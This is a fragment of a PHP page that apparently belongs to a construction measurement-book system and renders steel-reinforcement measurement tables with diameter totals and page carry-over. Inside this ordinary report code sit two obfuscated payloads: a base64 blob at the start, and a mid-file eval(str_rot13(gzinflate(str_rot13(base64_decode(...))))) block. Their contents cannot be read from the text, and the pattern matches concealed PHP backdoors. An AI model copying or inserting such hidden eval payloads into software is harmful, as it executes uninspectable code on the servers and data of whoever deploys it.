kTZIVZwGO7srMowa9CmqziekdAXQkwWbR8ol4utcH0C1RqrteSKAouDWvG8xr0LTygR7WFJjZqdzKMz191rSptDTReOOceMpKErJ8+Dd+V6lb6R0WvnXzZaYENOluKD5yloMZTUkEX4UBBSM6E0H32/PZyO/Ft2YXMG925TiD/BBE1ox6Es8Xtu6OqSaBXZ5aKeT0+6cjcYifCyAOQS1cy5hXq5sgZZaScsS4hSm9Een2aoF1LdKkHW8HgRIIgXL4KfKZEw9F2Q1B6ZknYB7LJYt4UReWZj4J+a0vOWGZk8m/AbZnLtv0vy2LPhHvXCqjC8Uzm9G1ArJYCqGW+IWeDQES/x3dpY6yHYmxR5SoaiqAoWnb0bJlEIhdkZUpqn8PhgWHsmGZfCHsmBKZsfjg7UASOCjBOF1gx3iGusQJdexIMuUHKoXcoXWYBVfLFVXy556lJFMzwSAQ3Oxg+XgdS2A56W7FKzh6PZZo6uaKrsbn9rMumbcuMMN5wmCcqhG/qHhDiUuz1QfKm01xWDrsAsEsJ/EyOeXORc7ULSEAOBh/fxNoQsfcYX3GyzV8ozFvTl0tgvW7icT853V65iLQoV/9dooIVbq79m3xGGKJV1NPk9bVakL/K9yysZtBqS3zt/BLkVZXK9kvs4FuMtqV4ywwtfXUFimzqrJfVTdfH9xTiIfty0HpVL0ox/sL2CjEGYsFazcel3iKndFTqktyhUcBPDFX+JYfU199SALtDvveUKOK5l9CpD11Ca0xkijdNRVfQfZoH9b5keS0BrcPhsQQVb/ijieooYLulC3kutTEYnL7tecCG9/AP7RtLrUlIAICjLPRdhctsDZEFFRsHafhLfNoPBbP4bM6MyaFXOhaxT9Mr+uzgytKFicCKUu4g/17wvWJ02Fh7r8nUCC6EDII6tTKmfbt4eDTscyEA7vdrcDvY43TlYdibwjgvNpTfqZwaU37rsAU/GPnmskmzNh2uWduofl9bjbfJ10ikGnJouMGUpRt6V3EiDpcvGUSS1vt88n536NajrXDIuLHMpbg0XDzgeOX1Bewi4qqrG/DOUstA5db0fhNGGvxEnepbOGLy0asNkBsKSxUwZniAzerdtSTYhsuXluKYFOEcuUhbzxW1nyGfXJ1Y2wnsdvLqRJ8QjOpPpx9jwQQI46wqlJARSngzLHKTP1Hc4eKrM9Mmr10bLui1mA+WEMdPY84KhPqdtx92CJpdY2nYPSBgA+7BDv7JEQnKwrxXICM/flP6t8B6duXSnTHPMon27tt4WAXJf22IJFcXYVro1I7E01XPuVHAN4A1Hfyd5zGZjskqM3MXmM3Srz4dvdv+fwQ0Ynt3GsHugQ+sXvPkh5tBWkqcqACghgrWF6wGp0z8b2h50IagCGFg7zI5Vr7XdalcOvP5G9EyBkG/g26xBJB3AxDM0daXbgTmFO7Ku/k7vcgl7sgAvG/pock1s02mXI4X2485B/mlGbUFX8pfmvUsvDLLohE+uLHGrx8XDXGkJfYBi5ohSCfyu/fpO3GJwg7cCuX3lKBG2Y9XIskaKHmpDlhRn3ESpUVPa1u6r3WQxpUZHk6LE8/Z7TjANYw933q8hOCFkEcu8W6Uul0j1U5kZ0YKmfMfp2MP1rJddWGRdZ5fTnzL1pvos5AtcW3t5AiX5P1tnUlxYuYUiSuuILJzeRDHVgBZpxwKjKbRJr+4RLhkg26SbpyFM0KjgHNEpk9v8QHDf8QFO3vpA6uhaoFnoU/pYpf3EVYHUDsMTSj7D4nG6Gl0cozSe1bl40U3oBC5B9WE3DuvxtaM5UhGEFZTUfZClnTL8xwmjdFkFbH2Y8bPw3SNbbUrzlxbn6NueQEmTGFWlaIqfJP1+IfxiDmj9PYD6jf/37/f3nfw==')))));
              //echo $measurequery."<br/>";
			   $sqlmeasurequery = mysql_query($measurequery);     
               if($sqlmeasurequery == true)
               {
                while ($List = mysql_fetch_object($sqlmeasurequery)) 
                { //echo $mpage;
				if($List->shortnotes == ""){ $List->shortnotes = $List->description; }
				$decimal = get_decimal_placed($List->subdivid,$sheetid);
				$sub_type = $List->sub_type;
				$meas_no1 = $List->measurement_no;
				$meas_no2 = $List->measurement_no2;
				if(($meas_no2 != "") && ($meas_no2 != 0))
				{
					$meas_no = $meas_no1*$meas_no2;
				}
				else
				{
					$meas_no = $meas_no1;
				}
				$_SESSION['last_row_check'] = 0;
					if($mpage > 100)
					{
						/*if($_GET['varid'] == 1)
						{
							
							
							?>
							<div id="dialog" class="dialogwindow" title="Choose MBook No." style=" background-color:#f9f8f6;font-size: 12px;">
							<p style="font-size:12px; font-weight:bold; color:#911200;">Select Next MBook Number</p>
							<select id="newmbooklist" name="mb" style="width:275px;">
							<option value="">---------------------Select--------------------</option>
							<?php echo $objBind->BindMBookList($mbookno,$sheetid,$staffid,$mbooktype); ?>
							</select>
							<br/>
							<span id="error_msg" style="color:#FF0000; font-weight:bold;"></span>
							<input type="button" class="submit_btn" id="btn" style="color:#FFFFFF;background-color:#9c27b0;border:none;" name="btn" value="Submit"/>
							<input type="button" class="cancel_btn" id="btn_cancel" style="color:#FFFFFF;background-color:#e51c23;border:none;" name="btn_cancel" value="Cancel"/>
							</div>
							<?php
						}
						$currentline = $start_line + 13;
						$prevpage = 100;
						$mpage = $newmbookpage;
						$mbookno = $newmbookno;*/
					}
					
					
					if(($mpage != $prevpage) && ($prevdate == $List->date) && ($prevsubdivid == $List->subdivid))
					{
						$tmb2 = $sumst;
                     $explodedval = explode("@",$tmb2); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
						 if($expval[0] == 'c'){ $totc = $totc + $expval[1]; }
                        }
                     } 
					 if($tot8 != "" || $tot10 != "" || $tot12 != "" || $tot16 != "" || $tot20 != "" || $tot25 != "" || $tot28 != "" || $tot32 != "" || $tot36!= "" || $totc != "")
					 {
					 ?>
					<tr height=''>
                    <td width='' colspan="4" class='labelcenter labelheadblue' style='text-align:right'><?php echo "B/f from Page ".$prevpage."/ Steel MB No.".$prevmbookno."";  ?></td>
                    <td width='' class='labelbold' style="text-align:right"></td>
					<td width='' class='labelbold' style="text-align:right"><?php echo $totc; ?></td>
					<td width='' class='labelbold' style="text-align:right"></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'><?php //echo $mpage; ?></td>-->
                	</tr>
					 <?php
					 $currentline++;
					 }
					?>
						
				<?php 
				//echo $currentline;
				
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				
				}
				}
				
                    $measurementdia=$List->measurement_dia;
                    $NOS=chop($List->measurement_no);
					$NOS2=chop($List->measurement_no2);
                    $LOM=chop($List->measurement_l);
					if(($NOS2 != "") && ($NOS2 != 0))
					{
                    	$totaldia=round(($NOS*$LOM*$NOS2),$decimal);
					}
					else
					{
                    	$totaldia=round(($NOS*$LOM),$decimal);
					}
                    
                    if($prevsubdiv_name != $List->subdiv_name)
                    {
                        if($prevsubdiv_name != "")
                        {
                            $temp = 1;
                        } 
                        if($prevsubdiv_name == "")
                        {
                        ?>
                            <tr height=''>
                                <td width='' class='labelcenter'><?php echo $List->date; ?></td>
                                <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                                <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                            </tr>
                  <?php 
				  		//$length1 = strlen($List->shortnotes);
						//$linecnt1 = ceil($length1/145);
						$wrap_cnt1 = 0;
						$WrapReturn1 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn1[0];
						$wrap_cnt1 = $WrapReturn1[1];
				  		$currentline = $currentline + $wrap_cnt1;
							if($currentline>31)
							{ 
								if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
								{
								echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
								}
								echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
								/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
								if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
							}
                        }
                    }
                   if(($prevdate != $List->date) && ($prevsubdiv_name == $List->subdiv_name))
                   {
                       if($prevdate !== "")
                       {
                      $temp = 1;
                       }
                   }
                   if($temp == 1)
                   {
                     $tmb = $sumst;
                     $explodedval = explode("@",$tmb); 
                     for($i=0;$i<count($explodedval);$i++)
                     {
                       if($explodedval[$i] != "")
                       {
                         $expval = explode("*",$explodedval[$i]); 
                         if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
                         if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
                         if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
                         if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
                         if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
                         if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
                         if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
                         if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
						 if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
						 if($expval[0] == 'c'){ $totc = $totc + $expval[1]; }
                        }
                     }
                        ?>
                <tr height=''>
                    <td width='' colspan="4" class='labelcenter' style='text-align:right'>
					<input type="text" style="width:100%" name="txt_pageid" readonly="" id="txt_pageid<?php echo $txtboxid; ?>" class="textboxcobf" />
					</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelbold' style="text-align:right"><?php echo $totc; ?></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot8 != "") { echo number_format($tot8,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot10 != "") { echo number_format($tot10,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot12 != "") { echo number_format($tot12,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot16 != "") { echo number_format($tot16,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot20 != "") { echo number_format($tot20,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot25 != "") { echo number_format($tot25,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot28 != "") { echo number_format($tot28,$prev_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($tot32 != "") { echo number_format($tot32,$prev_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($tot36 != "") { echo number_format($tot36,$prev_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
                	
                <?php 
				
				eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEra4EXyarf19I4fyiZxm5uIifeScbG2D1xR2U280d1q3S+rh/rP1VLLeULn8GYffgiH/mZcpnZc/xdBHxf1/42JS4+FfKgw6y/4FORxAOpN4tRl7MlUBU5K3MVQ/r1JbFsDvbCpZJYC/IMNdIwoM9bqsxVLrxRUVd28R+7eFqqNkLd9DS/be7imVLKPunpnwU54b8kjaEf45wAqSAbzNnPv9cawRkJeElobk5jIQVg+y+5cisfK2+VSITEi+USkovHNc47DPMyiUyeoyBDAycgkHcBW/po0Y6o5dlm7masUBZ7Cpy/Jncu2q2aWxzarfUs2cl9xeu/P2qKZyeikqwHMfOQiNXnpe2/VZ7bIF4R3SWjbbTsmEVsO905jqno/ZFRFkFhhROOCbCmzwwiHmWGDHydPvC+gclKSFyqB24rUOjwE3vpluZiT0/tu9RdX3roTWs4ETEJrBKOEmKcP5lff4TFUk78Ywy3/YsvyI37HB84Lbjgsgvj5tTsbOBEj8/KANWwrVzJrSTfS1jLddI+oXVnS1eQma+x++wEnNRxszLK+3GYpBzC1qlPyD5lCGoE3fsifBJmBKUZPi3JRqT0Hkc+Zoccfu2KGTJXfqWwHqKZzvS6fAsXa3Ve9V3g5b+Dr1pxkyDjcYvsbBxR7LCXUFdhvGg2CFalNF6TKY2tp6Pc2eQQ+ktC3WZ3t7BGtn8w/yUntzW3y/DC/z0siym5WTyGiCPcYjwePYrjSlR8g9g7KEzJsh+OodXE0kJZGTN9lfsH+OI7AQm+GMcJL2w1yGEiWTdOx25CuW9aCa9xES7GTS95Tb2nhM27aQYoBgd58O1zy6SIG4w7k3mmYODBgdYShw8vhpcprM2Pd5b8itism4ZH8FqGspriUyRxZfMA1NRRBZsWlfASYM8dfVpThqW2MjrNMJjE+M5jAOLRvFglr+Ntu89Ctv3NS714CioBw1muiwrzbeRr9h981w2N73iN8OkMlTGvpdvsqCC99JrYBOBTqaxaVrFqcmDelxBh4HsEjwqqUAYkEO31j4oxOVEir1oiq/tWlDFTSYEaz7UfVhqqeQka8SF/0AvHeKLgY8rpSdZLPM+jXwQGrNSCzqFyuUjHYVG/ESzc2uTJvDfSUXnahDCKYBd+HITF0lJy7YEnB3cLmlP8BbDWGeu1qUoCIRgGDcgJu6vMHxw36DAizj/Vda/9UsQz0ZBqsbkygA0w7l5DiSVC4I5NdiHJy4oedGERYOYYDZbFoloqErrVyIyVByxVZATqksaqeOOe05V83tHAZ+6NoRcd/VH2XN8CpQxyxqFkpCiK5BJRIFzDrhgZit8KMq6V9XNFA2REtTlVOhHRe3StCncKmv9NC3V2SjrWaFoPubVosS3wxeVzrdk0G21oDO9kgOBT3do0KHoYEac9Vxx4hOuueKSUnBBJ1oungitTSxhRawofCAGZMYbQwMEpJst/2YarUrYqAJlqYGPIKq/Lx7rosSxacsfvdSBIy22iskDKs5WlvtbhdUijpx5h38g1e5KxaRYZSYd4s8TvTsHT8Q7a0lDsMFjxrhXP36yiMz5ioHSfOx3Bqvit09AJl0jkprHGgathzMdytKHdsnNmj85FXrj7PMl/uoo7eP4nJ5j2LfnHDZBHHq0wTK9aCfMCCGkpdYqoJkpCBtiig0iBsd8EJ250GZz/rhCbpBQueItYecwUVhhCgmdJ42UHgqQ5jDzoViNHq5CwgqfShKq8C9IRwIU/KAX2s7ZfPK9Qmh1XofCbTeJEz7JY1ubyeVibv0YBuSHzOmiHXE68P7qcAYt7q4p0FG46Uf4avaKimVBZN4ssolEnOtSp8jyEgeHFuPQYd8YAACmuYREPIlZpev6hpv5R1jdSAcsGWzxHkjGnXYqoRwQ0EmKCHBSL8MaihRhwMEesh8Pu48N+qMRQYfosJa1XSBlvLfp097Ic6O36fD8zAlA2exr3ESTT6Wz2VwtX9XErHPRkE8gu2dVJ8w3wrMx64WDdYqrstzIQbfcxbn2wI+hAl/dTgNE3qcujkCizp09jtV0vtlZ3nnbZSV6EndOWF1ZLR3Ul0MHgvpJEQhprG1rbX6PgXhxoUj2n4P/rD8eUBvZ1YnY3rKGs0/c7nJW8uZxCH1lxZp0uFC21xoj4u/uXKsovdpUCE9bzNbDzycnx19pIlaLw7CI8DseuDXXmmeKQL9dyAbcFTVku7pB7lp/rk0blU+Y94roEBk3MPqcQ7zfl5Ug8A3dhsmvtD1zdZ+7qg7HBMZ0gZPQARr+LEwBQ477X2ZD92VsX6tZW9+0TD9wBwpCwgJs5NgdbgFFt+MtWzwcSwzVFKBrJ75IHzbtLH7WfuY1AEWwc7zMv+xi9ETn8QpEk0tRQHKkyg801gTxjUo1M7U3FuFSigc+Ms7ZgnltIszAeyKQTTRfHNuVCVdWW4gVjNoAgtUp8i0N1IICgdkAKqfNH+/V1ej1cANg11IHijnboXoFlt08puEYyLmoJk0CxuB0Yf2sE0LvAyC0fQZw0lST3eaTNc0slUGFUDuYEIefcJA4efqlxUyRE0A1IiXvErN+huUZtzK2RYdc6sYA9LsIEVWUDipj1JANdlRdQl9KDa0ZcM9f28rEbCZnTBmXHt2iCh0C6g5jhGMGm7It+IkZCO+06CEtRodwH1+thWCLHL0MDSsCxfGYaQOZnM7mwl8/eSt77aGK4fpRBc6lR7Uj3u4SWrqN23fV98GEBmXiIYj2097wtQnOD8fT3y2cjEKLct6gk64O/Lh69/6mP6JfRs+U5L/yOH0v4ej63/B1nv+/a/3+Pd/AQ==')))));

				if($prev_sub_type == 'c'){
                	$summary1 .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.","."".",".$prevsubdivid.",".$prevdivid.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$prev_decimal.",".$CouplerTotal.",".$prev_sub_type."@";//echo $summary1;
					$CouplerTotal = 0;
				}else{
                	$summary1 .= $prevsubdiv_name.",".$prevdate.",".$mpage.",".$mbookno.",".$totalweight_MT.",".$prevsubdivid.",".$prevdivid.",".$tot8.",".$tot10.",".$tot12.",".$tot16.",".$tot20.",".$tot25.",".$tot28.",".$tot32.",".$tot36.",".$txtboxid.",".$prev_decimal.","."".",".""."@";//echo $summary1;
				//echo $summary1."SSSS<br/>";
				}
				$currentline++;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
                //echo $summary1;
                //THIS PART IS FOR 2 LINE SPACE BETWEEN NEWDATE AND OLD DATE 
                if(($prevdate != $List->date) && ($prevdate !== ""))
                    {
					
                        ?>
                        <tr height='' style="border:none;" class="label" align="right">
						<td colspan="16" style="border:none;"><br/><?php //echo $staffname." - ".$designation; ?>&nbsp;&nbsp;</td>
						</tr>
						<tr height='' style="border:none;" class="label" align="right">
						<td colspan="5" style="border:none;">&nbsp;&nbsp;</td>
						<td colspan="6" style="border:none;">Prepared By&nbsp;&nbsp;</td>
						<td colspan="5" style="border:none;">Checked By&nbsp;&nbsp;</td>
						</tr>
                <?php
				$currentline = $currentline+3;
					if($currentline>31)
					{ 
						if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
						{
						echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
						}
						echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
						/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
						if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
					}
                  }
                    ?>
                <tr height=''>
                            <td width='8%' class='labelcenter'><?php echo $List->date; ?></td>
                            <td width='' class='labelcenter'><?php echo $List->subdiv_name; ?></td>
                            <td width='' colspan="14" class='labelcenter' style="text-align:left;"><?php echo $List->shortnotes; ?></td>
                 </tr>
                        <?php 
                         $sumst = "";  
					   	//$length2 = strlen($List->shortnotes);
						//$linecnt2 = ceil($length2/145);
						
						$wrap_cnt2 = 0;
						$WrapReturn2 = getWordWrapCount($List->shortnotes,145);
						$shortnotes = $WrapReturn2[0];
						$wrap_cnt2 = $WrapReturn2[1];
				  		$currentline = $currentline + $wrap_cnt2;
						if($currentline>31)
						{ 
							if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
							{
							echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$prev_decimal,$NextMBPageList[$NextMbIncr]);
							}
							echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
							/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
							if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
						}
                  }
				//$descwork = wordwrap($List->descwork,45,"<br>\n");
				//$wwl = explode("\n", $descwork);
				//$wwlcount = count($wwl);
				//$length3 = strlen(trim($descwork));
				//$linecnt3 = ceil($length3/45); //echo $linecnt3;
				
				$wrap_cnt3 = 0;	
				$WrapReturn3 = getWordWrapCount($List->descwork,50);
				$descwork = $WrapReturn3[0];
				$wrap_cnt3 = $WrapReturn3[1];
				$currentline = $currentline + $wrap_cnt3;
				//$currentline = $currentline + $wwlcount;
                    ?>
                
                <tr height=''>
                    <td width='8%' class='labelcenter'><?php //echo $List->subdivid; ?></td>
                    <td width='4%' class='labelcenter'><?php //echo $currentline;//if(($prevdate != $List->date) && ($prevsubdiv_name != $List->subdiv_name)) { echo $List->subdiv_name; } else { echo ""; } ?></td>
                    <td width='12%' class='labelcenter' style="text-align:left;" nowrap="nowrap"><?php echo $descwork; ?></td>
                    <td width='3%' class='labelcenter' style="text-align:right"><?php if($List->measurement_dia != 0) { echo $List->measurement_dia; } ?></td>
                    <td width='3%' class='labelcenter' style="text-align:right"><?php if($List->measurement_no2 != 0) { echo $List->measurement_no2; } ?></td>
                    <td width='3%' class='labelcenter' style="text-align:right"><?php if($List->measurement_no != 0) { echo $List->measurement_no; } ?></td>
                    <td width='4%' class='labelcenter' style="text-align:right"><?php if($List->measurement_l != 0) { echo $List->measurement_l; } ?></td>
                    <?php
        if(($measurementdia == 8) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 8; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaeight+=$totaldia; }
                else { ?><td width='7%' class='labelcenter'></td> <?php }
        if(($measurementdia == 10) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 10; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiaten+=$totaldia; }    
                else { ?><td width='7%' class='labelcenter'></td> <?php }           
        if(($measurementdia == 12) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 12; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwelve+=$totaldia; }                
                else { ?><td width='7%' class='labelcenter'></td> <?php }         
        if(($measurementdia == 16) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 16; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiasixteen+=$totaldia; }  
                else { ?><td width='7%' class='labelcenter'></td> <?php }    
        if(($measurementdia == 20) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 20; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwenty+=$totaldia; }      
                else { ?><td width='7%' class='labelcenter'></td> <?php }      
        if(($measurementdia == 25) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 25; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyfive+=$totaldia; }     
                else { ?><td width='7%' class='labelcenter'></td> <?php }  
        if(($measurementdia == 28) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 28; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiatwentyeight+=$totaldia; }     
                else { ?><td width='7%' class='labelcenter'></td> <?php }   
        if(($measurementdia == 32) && ($sub_type != 'c')){ ?><td width='7%' class='labelcenter' style="text-align:right"><?php $dia = 32; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtytwo+=$totaldia; }             
                else { ?><td width='7%' class='labelcenter'></td> <?php }
		if(($measurementdia == 36) && ($sub_type != 'c')){ ?><td width='6%' class='labelcenter' style="text-align:right"><?php $dia = 36; echo number_format($totaldia,$decimal,".",","); ?></td><?php $totaldiathirtysix+=$totaldia; }             
                else { ?><td width='6%' class='labelcenter'></td> <?php }		                
                  ?> 
                     <!--<td width='2%' class='labelcenter'><?php echo "&nbsp";//$List->remarks; ?></td>-->
                </tr>
                <?php
               
                $prevdate = $List->date;
				$prevpage = $mpage; $prevmbookno = $mbookno;
                if(($sub_type == 'c') && ($meas_no != 0) && ($meas_no != "")){
					$sumst .= "c"."*".$meas_no."@";
				}else{
                	$sumst .= $dia."*".$totaldia."@";
				}
                $temp = 0;
				$length3 = strlen($List->descwork);
				$linecnt3 = ceil($length3/20); //echo $linecnt3;
				//$currentline = $currentline + $linecnt3;
				if($currentline>31)
				{ 
					if(($prevsubdivid == $List->subdivid) && ($prevdate == $List->date))
					{
					echo display_carry($sumst,$mbookno,$mpage,$NextMBList[$NextMbIncr],$decimal,$NextMBPageList[$NextMbIncr]);
					}
					echo check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$NextMBList[$NextMbIncr],$table1,$NextMBPageList[$NextMbIncr]); $currentline = 0;$currentline = $start_line + 13;$mpage++;	
					/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
					if($mpage > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $mpage = 1; }else{ $UsedMBArr[$mbookno][1] = $mpage-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $mpage = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
				}
				$prevsubdiv_name = $List->subdiv_name;
				if(($sub_type == 'c') && ($meas_no != 0) && ($meas_no != ""))
				{
                //$summary1 .= $List->subdiv_name.",".$List->date.",".$mpage.",".$mbookno.","."".",".$List->subdivid.",".$List->div_id.","."".","."".","."".","."".","."".","."".","."".","."".","."".",".$txtboxid.",".$decimal.",".$meas_no.",".$sub_type."@";//echo $summary1;
				// Coupler Item Comment on 04/04/2023 for coupler item carry over
				$CouplerTotal = $CouplerTotal + $meas_no;
				//echo $summary1."hghfgj<br/>";
				//echo $summary1."SSSS<br/>";
				}
				//echo $sub_type."<br/>";
				$prev_sub_type = $sub_type;
                $prevsubdivid = $List->subdivid;
				$prevdivid = $List->div_id; 
				$prev_decimal = $decimal;
